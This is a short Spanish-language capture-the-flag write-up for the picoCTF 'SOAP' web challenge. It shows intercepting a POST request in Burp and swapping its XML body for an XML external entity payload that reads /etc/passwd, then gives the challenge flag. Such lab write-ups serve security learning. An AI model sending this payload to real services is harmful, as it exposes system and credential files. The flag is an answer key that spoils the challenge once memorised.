# Retos picoCTF

# Level SOAP

## Objetivo
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Web Portal

## Solucion
Al inspeccionar la pagina nos damos cuenta que hace varios POST por lo que podemos usar esto a nuestro favor.

Se abre burp, y intercepte el metodo POST que tenia como mesaje original lo siguiente <?xml version="1.0" encoding="UTF-8"?><data><ID>3</ID></data>

Modificamos el mensaje y enviamos lo siguiente <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data><ID>&file;</ID></data>

Y nos da como resultado la bandera: picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}

## Referencias


